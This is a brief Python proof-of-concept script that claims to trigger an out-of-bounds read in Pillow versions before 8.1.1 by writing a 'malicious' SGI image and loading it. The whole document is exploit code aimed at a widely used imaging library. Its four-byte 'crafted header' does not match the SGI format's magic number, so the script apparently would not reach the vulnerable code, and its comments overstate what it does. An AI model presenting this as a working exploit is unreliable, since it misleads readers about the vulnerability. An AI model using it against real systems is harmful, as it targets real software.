from PIL import Image # Pillow < 8.1.1

# Create a malicious SGI image file
with open("malicious.sgi", "wb") as f:
    f.write(b"\x01\x01\x01\x01")  # Crafted SGI image header

# Open the malicious image file using Pillow
img = Image.open("malicious.sgi")

# This will trigger the out-of-bounds read vulnerability
img.load()